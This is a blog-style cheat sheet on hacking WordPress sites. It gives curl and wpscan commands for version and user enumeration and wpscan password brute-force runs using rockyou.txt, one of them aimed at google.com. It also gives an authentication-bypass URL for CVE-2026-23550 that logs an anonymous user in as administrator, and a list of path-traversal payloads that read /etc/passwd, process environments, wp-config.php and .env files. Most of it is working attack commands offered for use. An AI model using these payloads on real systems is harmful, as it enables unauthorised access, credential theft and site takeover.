---
title: "Wordpress Hacking Stuff"
date: 2026-02-26 00:00:00 +0800
categories: [Web Exploitation]
tags: [wordpress-hacking, wordpress]
platform: Web
author: 0xmr
image: /assets/img/posts/wordpress.jpg
excerpt: "Hacking Wordpress..."
---

> WordPress sites are frequently hacked due to automated attacks targeting common vulnerabilities, primarily exploiting outdated plugins, themes, or weak user credentials.
> Hackers use tools to scan for known flaws across millions of sites, often focusing on unpatched plugins and themes, which are the leading cause of compromises.
> A single vulnerable plugin can allow attackers to gain full control, install malware, or redirect traffic. 

> Key Attack Methods
- Versions Detection:
- CVE Exploitation:
- Common Creds and Weak Creds:
- Plugin and Theme Vulnerabilities: 
- Brute Force & Dictionary Attacks:  
- Session Hijacking: 
- Phishing: 
- Exploiting Core Vulnerabilities: 
- Malware Distribution via Blockchain: 

# Manually Hacking

### Version

```bash
# Manually check source code
Press ----> Ctrl + f (Search wordpress)

# Curl
curl -s http://example.com/ | grep 'WordPress'     # http
curl -s http://example.com/ | grep -i '?ver='
curl -s https://example.com/ | grep 'WordPress'    # https
curl -s https://example.com/ | grep -i '?ver='
```
### Username

```bash
# Sitemap
      /wp-sitemap-users-1.xml
      /sitemap.xml
      /author-sitemap.xml

# Authors Brute force
      /author/username/.

# oembed api
      /?rest_route=/oembed/1.0/embed&url=

# wp-json
      /wp-json/wp/v2/users
      /wp-json/wp/v2/users/ grep -i 'name'

# login page Error Messages
      Validate the list of users, have there account exists or not !
```
> Updating in a mean while...
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# Automation Hacking 

### Version 

```bash
wpscan --url http://example.com   --api-token YOUR_API_TOKEN   
```

### Username

```bash
wpscan --url http://target.com --enumerate u   --api-token YOUR_API_TOKEN 
```
### Login Page Username and Password Brute force

```bash
# Enumerate users and Brute passwords
wpscan --url https://google.com/ -e u -P /usr/share/wordlists/rockyou.txt

# Specific user Password Brute force
wpscan --url https://google.com -U admin -P /usr/share/wordlists/rockyou.txt --threads 10   
```

## ⚡Overall Power

```bash
wpscan --url https://example.com/ -e vt,tt,cb,dbe,u,m,p  --api-token <token>  --format json --output scan.json
wpscan --url https://example.com/ --api-token <token> -e p,u --plugins-detection aggressive --plugins-version-detection mixed

ap ---> All plugins
p  ---> Vulnerable plugins
vt ---> Vulnerable themes
tt ---> Timthumbs
cb ---> Config backups
dbe --> Database exports
u  ---> User IDs
m  ---> Media IDs
```
> Updating in a mean while...
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## CVE Exploitation

# CVE-2026-23550
> The URL bypasses authentication because supplying origin=mo (or a matching User-Agent) together with any type parameter triggers Modular DS's direct request mode, which relaxes the auth middleware to only check whether the site itself has an active Modular connection (rather than verifying the identity of the caller). Since the /login/{modular_request} route defaults to logging in as the site's admin whenever no specific user ID is passed in the request body, this combination lets any unauthenticated user get logged in as an administrator

```bash
http://example.com/api/modular-connector/login/anything?origin=mo&type=foo
```

# CVE-2023-6553
> This cve shows the Remote Code Execution vulnerbility in Backup Migration wordpress Plugin Version=1.3.7 via the /includes/backup-heart.php file. You can Download the backup via /wp-content/uploads/*  directory.

Nuclei Template Detection 
[Nuclei Resource link](https://github.com/0xmrsecurity/Public_Poc/blob/main/nuclei/CVE-2023-6553.yaml)

<img width="1901" height="461" alt="image" src="https://github.com/user-attachments/assets/8b6ef40f-53a4-4ad9-a070-e5e74c956f34" />

# lfi 
> local file Inclusion
```bash
/wordpress/images../etc/passwd
/wordpress/images../etc/nginx/sites-available/default
/wordpress/images../proc/self/cmdline
/wordpress/images../proc/self/environ
/wordpress/images../wp-config.php
/wordpress/images../.env
```
